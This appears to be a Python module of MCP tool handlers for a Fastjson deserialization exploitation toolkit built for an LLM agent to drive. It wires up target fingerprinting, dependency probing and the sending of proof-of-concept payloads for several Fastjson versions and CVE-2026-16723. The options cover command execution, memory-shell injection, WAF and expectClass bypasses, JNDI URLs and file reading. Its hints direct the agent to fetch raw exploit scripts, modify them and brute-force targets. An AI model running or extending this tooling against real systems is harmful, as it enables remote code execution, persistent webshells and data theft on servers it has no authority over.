"""Pure MCP tool handlers (no transport). Reuses detect / deps / poc engines."""

from __future__ import annotations

from typing import Any, Literal, Optional

from pydantic import BaseModel, ValidationError

from fastjson_toolkit.api.schemas import (
    DepsRequest,
    DetectRequest,
    ExpectClassRequest,
    Poc1247Request,
    Poc1268Request,
    Poc1280Request,
    Poc16723Request,
    VersionRequest,
)
from fastjson_toolkit.config import load_dotenv
from fastjson_toolkit.deps import FastjsonDepsDetector, default_catalog
from fastjson_toolkit.detect import FastjsonDetector
from fastjson_toolkit.dnslog import CeyeConfig
from fastjson_toolkit.expect import FastjsonExpectClassDetector
from fastjson_toolkit.mcp.docs_loader import get_doc, list_docs
from fastjson_toolkit.poc import (
    Poc1247SendOptions,
    Poc1268SendOptions,
    Poc1280SendOptions,
    Poc16723Options,
    list_poc_1247_gadgets,
    list_poc_1268_gadgets,
    list_poc_1280_gadgets,
    run_cve_2026_16723,
    run_poc_1247,
    run_poc_1268,
    run_poc_1280,
)
from fastjson_toolkit.poc.v1_2_47 import get_gadget as get_poc_1247_gadget
from fastjson_toolkit.poc.v1_2_68 import get_gadget as get_poc_1268_gadget
from fastjson_toolkit.poc.v1_2_80 import get_gadget as get_poc_1280_gadget
from fastjson_toolkit.version import FastjsonVersionDetector
from fastjson_toolkit.waf import WafOptions, list_techniques

PocFamily = Literal["1.2.47", "1.2.68", "1.2.80", "cve-2026-16723"]


def _dump(model: BaseModel | None) -> dict[str, Any] | None:
    if model is None:
        return None
    return model.model_dump(mode="json")


def _ceye_from_env(*, enabled: bool = True) -> CeyeConfig | None:
    """CEYE 一律读项目 .env / 环境变量；MCP 不暴露 token/domain 覆盖参数。"""
    if not enabled:
        return None
    load_dotenv()
    return CeyeConfig.from_env()


def _err(message: str, **extra: Any) -> dict[str, Any]:
    return {"ok": False, "error": message, **extra}


def _fetch_health(target: str, *, timeout: float = 5.0, insecure: bool = False) -> dict[str, Any] | None:
    """Best-effort GET {origin}/api/health for lab / app capability hints."""
    from urllib.parse import urljoin, urlparse, urlunparse

    import httpx

    raw = (target or "").strip()
    if not raw:
        return None
    if "://" not in raw:
        raw = "http://" + raw
    parsed = urlparse(raw)
    origin = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
    url = urljoin(origin + "/", "api/health")
    try:
        resp = httpx.get(url, timeout=timeout, verify=not insecure, trust_env=False)
        if resp.status_code != 200:
            return None
        data = resp.json()
        return data if isinstance(data, dict) else None
    except Exception:  # noqa: BLE001
        return None


# ---------------------------------------------------------------------------
# detect_pipeline
# ---------------------------------------------------------------------------


def detect_pipeline(
    target: str,
    *,
    include_dns_detect: bool = True,
    include_dns_version: bool = False,
    timeout: float = 10.0,
    headers: dict[str, str] | None = None,
    proxy: str | None = None,
    insecure: bool = False,
    base_body: str | None = None,
) -> dict[str, Any]:
    """识别 → 版本 → 期望类（非 Fastjson 时跳过后续）。

    DNS / CEYE：有 ``CEYE_TOKEN``（及可选 ``CEYE_DOMAIN``）时自动轮询；
    无需也不应在 MCP 里传 token/domain。
    """
    target = (target or "").strip()
    if not target:
        return _err("target 不能为空")

    headers = headers or {}
    skipped: list[str] = []
    next_actions: list[str] = []
    content_type = "application/json"
    ceye_wait_detect = 8.0
    ceye_wait_version = 10.0
    timing_threshold_ms = 800.0

    detect_req = DetectRequest(
        target=target,
        include_dns=include_dns_detect,
        use_ceye=True,
        timeout=timeout,
        timing_threshold_ms=timing_threshold_ms,
        headers=headers,
        proxy=proxy,
        insecure=insecure,
        content_type=content_type,
    )
    ceye_cfg = _ceye_from_env(enabled=detect_req.include_dns)
    detector = FastjsonDetector(
        timeout=detect_req.timeout,
        headers=detect_req.headers or None,
        proxy=detect_req.proxy,
        verify_tls=not detect_req.insecure,
        ceye=ceye_cfg,
        ceye_wait=ceye_wait_detect,
        timing_threshold_ms=detect_req.timing_threshold_ms,
        content_type=detect_req.content_type,
    )
    try:
        detect_result = detector.detect(target, include_dns=detect_req.include_dns)
    except Exception as exc:  # noqa: BLE001
        return _err(f"识别失败: {exc}")
    finally:
        detector.close()

    version_result = None
    expect_result = None
    # 路径发现后的有效反序列化点（供 version / expect 复用）
    effective_target = (
        (detect_result.raw or {}).get("resolved_url")
        or detect_result.target
        or target
    )
    health = (detect_result.raw or {}).get("path_discovery", {}).get("health")
    if not isinstance(health, dict):
        health = _fetch_health(effective_target, timeout=min(timeout, 5.0), insecure=insecure)

    if not detect_result.is_fastjson:
        skipped.extend(["version", "expect"])
        next_actions = list(detect_result.next_actions or [])
        if not next_actions:
            next_actions.append("docs_list")
        out_nf: dict[str, Any] = {
            "ok": True,
            "detect": _dump(detect_result),
            "version": None,
            "expect": None,
            "skipped": skipped,
            "next_actions": next_actions,
            "effective_target": effective_target,
            "summary": detect_result.summary
            or "未判定为 Fastjson，已跳过版本与期望类探测",
        }
        if health:
            out_nf["health"] = health
            out_nf["summary"] += "；已附带 /api/health 信息（若有）"
        return out_nf

    version_req = VersionRequest(
        target=effective_target,
        include_dns=include_dns_version,
        use_ceye=True,
        timeout=timeout,
        headers=headers,
        proxy=proxy,
        insecure=insecure,
        content_type=content_type,
    )
    v_ceye = _ceye_from_env(enabled=version_req.include_dns)
    version_detector = FastjsonVersionDetector(
        timeout=version_req.timeout,
        headers=version_req.headers or None,
        proxy=version_req.proxy,
        verify_tls=not version_req.insecure,
        ceye=v_ceye,
        ceye_wait=ceye_wait_version,
        content_type=version_req.content_type,
    )
    try:
        version_result = version_detector.detect(
            effective_target, include_dns=version_req.include_dns
        )
    except Exception as exc:  # noqa: BLE001
        skipped.append("version")
        version_error = str(exc)
    else:
        version_error = None
    finally:
        version_detector.close()

    expect_req = ExpectClassRequest(
        target=effective_target,
        base_body=base_body,
        timeout=timeout,
        headers=headers,
        proxy=proxy,
        insecure=insecure,
        content_type=content_type,
    )
    expect_detector = FastjsonExpectClassDetector(
        timeout=expect_req.timeout,
        headers=expect_req.headers or None,
        proxy=expect_req.proxy,
        verify_tls=not expect_req.insecure,
        content_type=expect_req.content_type,
    )
    try:
        expect_result = expect_detector.detect(
            effective_target, base_body=expect_req.base_body
        )
    except Exception as exc:  # noqa: BLE001
        skipped.append("expect")
        expect_error = str(exc)
    else:
        expect_error = None
    finally:
        expect_detector.close()

    next_actions = [
        f"deps_probe(target={effective_target!r})",
        "poc_catalog",
        "docs_list",
    ]
    if expect_result is not None and getattr(expect_result, "has_expect_class", None):
        next_actions.insert(
            0,
            f"poc_run(family=…, expect_bypass=true, target={effective_target!r})",
        )

    # 依赖提示：health.deps 缺 commons_io 时提醒换 gadget 靶场 / JDK 链
    capability_notes: list[str] = []
    if isinstance(health, dict):
        deps = health.get("deps")
        if isinstance(deps, dict) and deps.get("commons_io") is False:
            capability_notes.append(
                "health.deps.commons_io=false：勿发 commons-io gadget；"
                "改用 JDK 链或换 18268 gadget 靶场"
            )
        if health.get("autotype") is False:
            capability_notes.append(
                "health.autotype=false：优先 AutoCloseable/Exception expectClass，"
                "deps_probe 将自动用 Class 探针"
            )

    out: dict[str, Any] = {
        "ok": True,
        "detect": _dump(detect_result),
        "version": _dump(version_result),
        "expect": _dump(expect_result),
        "skipped": skipped,
        "next_actions": next_actions + capability_notes,
        "effective_target": effective_target,
        "summary": "；".join(
            part
            for part in [
                detect_result.summary,
                version_result.summary if version_result else None,
                expect_result.summary if expect_result else None,
                *capability_notes,
            ]
            if part
        ),
    }
    if health:
        out["health"] = health
    if version_error:
        out["version_error"] = version_error
    if expect_error:
        out["expect_error"] = expect_error
    return out


# ---------------------------------------------------------------------------
# deps_probe
# ---------------------------------------------------------------------------


def deps_probe(
    target: str,
    *,
    method: str = "character",
    classes: list[str] | None = None,
    categories: list[str] | None = None,
    timeout: float = 10.0,
    concurrency: int = 6,
    headers: dict[str, str] | None = None,
    proxy: str | None = None,
    insecure: bool = False,
) -> dict[str, Any]:
    """依赖探测。有报错回显时用 character；无回显可试 dns（CEYE 读 .env）。"""
    target = (target or "").strip()
    if not target:
        return _err("target 不能为空")

    method = (method or "character").strip().lower()
    if method not in ("character", "class", "dns"):
        return _err("method 仅支持 character、class 或 dns")

    req = DepsRequest(
        target=target,
        method=method,
        classes=classes or [],
        categories=categories or [],
        use_ceye=True,
        timeout=timeout,
        concurrency=concurrency,
        headers=headers or {},
        proxy=proxy,
        insecure=insecure,
        content_type="application/json",
    )
    ceye_cfg = _ceye_from_env(enabled=method == "dns")
    detector = FastjsonDepsDetector(
        timeout=req.timeout,
        headers=req.headers or None,
        proxy=req.proxy,
        verify_tls=not req.insecure,
        ceye=ceye_cfg,
        ceye_wait=10.0,
        content_type=req.content_type,
        concurrency=req.concurrency,
    )
    try:
        result = detector.scan(
            target,
            method=method,
            classes=req.classes or None,
            categories=req.categories or None,
        )
    except Exception as exc:  # noqa: BLE001
        return _err(f"依赖探测失败: {exc}")
    finally:
        detector.close()

    return {"ok": True, "result": _dump(result)}


def deps_catalog() -> dict[str, Any]:
    return {
        "ok": True,
        "catalog": [
            {
                "class": e.clazz,
                "description": e.description,
                "category": e.category,
            }
            for e in default_catalog()
        ],
    }


# ---------------------------------------------------------------------------
# poc
# ---------------------------------------------------------------------------


def poc_catalog(family: Optional[PocFamily] = None) -> dict[str, Any]:
    """列出 gadget / 回显引擎 / WAF 技巧。"""
    from fastjson_toolkit.poc.echo import list_engines

    families: dict[str, Any] = {
        "1.2.47": list_poc_1247_gadgets(),
        "1.2.68": list_poc_1268_gadgets(),
        "1.2.80": list_poc_1280_gadgets(),
        "cve-2026-16723": [
            {
                "id": "cve-2026-16723",
                "modes": ["http", "fd"],
                "description": "1.2.83 jar:http / fd-cache 证明 PoC（始终对 target 执行）",
            }
        ],
    }
    if family is not None:
        if family not in families:
            return _err(f"未知 family: {family}", families=list(families))
        families = {family: families[family]}

    return {
        "ok": True,
        "gadgets": families,
        "echo_engines": list_engines(),
        "waf_techniques": [
            {
                "id": t.id,
                "title": t.title,
                "description": t.description,
            }
            for t in list_techniques()
        ],
        "expect_bypass_hint": {
            "1.2.47": "expect_bypass=true → getter_trigger=currency",
            "1.2.68": "expect_bypass=true → wrap_currency=true",
            "1.2.80": "expect_bypass=true → wrap_currency=true",
            "cve-2026-16723": "无独立期望类绕过开关",
        },
        "script_hint": (
            "需要按环境改逻辑时用 poc_script(family, gadget) 取固定原脚本，由 LLM 自行修改；"
            "当前主要收录 1.2.68/io_read_error（可改 ERROR_MARKERS / MATCH_BOM；"
            "本仓库靶场命中多为 200+bOM）。"
            "自动化爆破优先 poc_run(family=1.2.68, send=true, "
            "options={gadget:io_read_error, url, read_length})。"
        ),
    }


def _merge_options(base: dict[str, Any], options: dict[str, Any] | None) -> dict[str, Any]:
    merged = dict(base)
    if options:
        for key, value in options.items():
            if value is not None:
                merged[key] = value
    return merged


def poc_run(
    family: PocFamily,
    *,
    send: bool = False,
    target: str | None = None,
    expect_bypass: bool = False,
    waf_techniques: list[str] | None = None,
    waf_options: dict[str, Any] | None = None,
    options: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """生成或发送各版本 PoC。"""
    waf_techniques = list(waf_techniques or [])
    opts = dict(options or {})

    if waf_options is not None:
        try:
            waf_model = WafOptions.model_validate(waf_options)
        except ValidationError as exc:
            return _err(f"waf_options 无效: {exc}")
        opts["waf_options"] = waf_model
    if waf_techniques:
        opts["waf_techniques"] = waf_techniques

    if target is not None:
        opts["target"] = target

    try:
        if family == "1.2.47":
            return _run_1247(send=send, expect_bypass=expect_bypass, opts=opts)
        if family == "1.2.68":
            return _run_1268(send=send, expect_bypass=expect_bypass, opts=opts)
        if family == "1.2.80":
            return _run_1280(send=send, expect_bypass=expect_bypass, opts=opts)
        if family == "cve-2026-16723":
            return _run_16723(opts=opts)
        return _err(f"未知 family: {family}")
    except ValidationError as exc:
        return _err(f"参数校验失败: {exc}")
    except KeyError as exc:
        return _err(str(exc))
    except ValueError as exc:
        return _err(str(exc))
    except Exception as exc:  # noqa: BLE001
        return _err(f"PoC 失败: {exc}")


def poc_script(
    family: str | None = None,
    gadget: str | None = None,
) -> dict[str, Any]:
    """返回固定原脚本，供 LLM 按环境自行修改。

    不传参：列出可用脚本摘要。
    传 family + gadget：返回固定脚本正文。
    """
    from fastjson_toolkit.poc.scripts import find_script, get_script, list_scripts

    if not family or not gadget:
        items = find_script(family, gadget) if family or gadget else list_scripts()
        return {
            "ok": True,
            "scripts": [
                {
                    "family": m.family,
                    "gadget": m.gadget,
                    "filename": m.filename,
                    "title": m.title,
                    "summary": m.summary,
                }
                for m in items
            ],
            "hint": "传入 family 与 gadget 获取固定原脚本正文，由 LLM 按环境自行修改。",
        }

    try:
        meta, script = get_script(family, gadget)
    except FileNotFoundError as exc:
        return _err(
            str(exc),
            scripts=[
                {"family": m.family, "gadget": m.gadget, "title": m.title}
                for m in list_scripts()
            ],
        )
    return {
        "ok": True,
        "family": meta.family,
        "gadget": meta.gadget,
        "filename": meta.filename,
        "title": meta.title,
        "summary": meta.summary,
        "script": script,
    }


def _run_1247(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[str, Any]:
    data = _merge_options({"send": send}, opts)
    if expect_bypass and "getter_trigger" not in data:
        data["getter_trigger"] = "currency"
    req = Poc1247Request.model_validate(data)
    if req.send and not (req.target or "").strip():
        return _err("send=true 时必须提供 target")
    get_poc_1247_gadget(req.gadget)
    result = run_poc_1247(
        Poc1247SendOptions(
            gadget=req.gadget,
            jndi_url=req.jndi_url,
            bcel_code=req.bcel_code,
            class_b64=req.class_b64,
            user_overrides=req.user_overrides,
            serialized_b64=req.serialized_b64,
            h2_url=req.h2_url,
            getter_trigger=req.getter_trigger,
            currency_field=req.currency_field,
            json_key_with_type=req.json_key_with_type,
            json_key_as_array=req.json_key_as_array,
            preset=req.preset,  # type: ignore[arg-type]
            proof_path=req.proof_path,
            proof_content=req.proof_content,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
    )
    return {"ok": True, "family": "1.2.47", "result": _dump(result)}


def _run_1268(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[str, Any]:
    data = _merge_options({"send": send}, opts)
    if expect_bypass and "wrap_currency" not in data:
        data["wrap_currency"] = True
    req = Poc1268Request.model_validate(data)
    if req.send and not (req.target or "").strip():
        return _err("send=true 时必须提供 target")
    entry = get_poc_1268_gadget(req.gadget)
    result = run_poc_1268(
        Poc1268SendOptions(
            gadget=req.gadget,
            file=req.file,
            content=req.content,
            source=req.source,
            url=req.url,
            guess_byte=req.guess_byte,
            bom_bytes=req.bom_bytes,
            read_length=req.read_length,
            read_charset=req.read_charset,
            read_charset_bytes=req.read_charset_bytes,
            host=req.host,
            port=req.port,
            user=req.user,
            jdbc_url=req.jdbc_url,
            mysql_version=req.mysql_version,
            outbound=req.outbound,
            named_pipe_path=req.named_pipe_path,
            socket_factory_arg=req.socket_factory_arg,
            wrap_currency=req.wrap_currency,
            currency_field=req.currency_field,
            preset=req.preset,  # type: ignore[arg-type]
            class_b64=req.class_b64,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            attack_base=req.attack_base,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
    )
    dumped = _dump(result) or {}
    out: dict[str, Any] = {"ok": True, "family": "1.2.68", "result": dumped}
    requires = list(getattr(entry, "requires", ()) or [])
    if requires:
        out["requires"] = requires
        if req.send and dumped.get("status_code", 0) and int(dumped.get("status_code") or 0) >= 400:
            out["capability_hint"] = (
                f"gadget 需要 {requires}；若 deps_probe/health 显示缺失，"
                "请换 JDK 链或具备该依赖的实例（如 18268 而非 18068）"
            )
    if req.gadget == "io_read_error" and req.send and not req.read_length:
        out["hint"] = (
            "未传 options.read_length：仅发送单次探针。"
            "要逐字节读全文请设 read_length（并可用 read_charset）。"
        )
    return out


def _run_1280(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[str, Any]:
    data = _merge_options({"send": send}, opts)
    if expect_bypass and "wrap_currency" not in data:
        data["wrap_currency"] = True
    req = Poc1280Request.model_validate(data)
    if req.send and not (req.target or "").strip():
        return _err("send=true 时必须提供 target")
    get_poc_1280_gadget(req.gadget)
    result = run_poc_1280(
        Poc1280SendOptions(
            gadget=req.gadget,
            file=req.file,
            content=req.content,
            url=req.url,
            guess_byte=req.guess_byte,
            host=req.host,
            port=req.port,
            user=req.user,
            outbound=req.outbound,
            named_pipe_path=req.named_pipe_path,
            socket_factory_arg=req.socket_factory_arg,
            classpath=req.classpath,
            wrap_currency=req.wrap_currency,
            currency_field=req.currency_field,
            preset=req.preset,  # type: ignore[arg-type]
            class_b64=req.class_b64,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            attack_base=req.attack_base,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            reset_cache=req.reset_cache,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
    )
    return {"ok": True, "family": "1.2.80", "result": _dump(result)}


def _run_16723(*, opts: dict[str, Any]) -> dict[str, Any]:
    req = Poc16723Request.model_validate(opts)
    if not (req.target or "").strip():
        return _err("cve-2026-16723 必须提供 target")
    result = run_cve_2026_16723(
        Poc16723Options(
            target=req.target,
            mode=req.mode,  # type: ignore[arg-type]
            host=req.host,
            port=req.port,
            cmd=req.cmd,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            json_path=req.json_path,
            docker_container=req.docker_container,
            reuse_type=req.reuse_type,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
        )
    )
    return {"ok": True, "family": "cve-2026-16723", "result": _dump(result)}


# ---------------------------------------------------------------------------
# docs
# ---------------------------------------------------------------------------


def docs_list() -> dict[str, Any]:
    try:
        items = list_docs()
    except FileNotFoundError as exc:
        return _err(str(exc))
    return {
        "ok": True,
        "docs": [
            {
                "slug": d.slug,
                "title": d.title,
                "description": d.description,
                "order": d.order,
            }
            for d in items
        ],
        "hint": "使用 docs_get(slug=...) 获取正文",
    }


def docs_get(slug: str) -> dict[str, Any]:
    try:
        doc = get_doc(slug)
    except FileNotFoundError as exc:
        return _err(str(exc))
    return {
        "ok": True,
        "slug": doc.slug,
        "title": doc.title,
        "description": doc.description,
        "order": doc.order,
        "content": doc.content,
    }

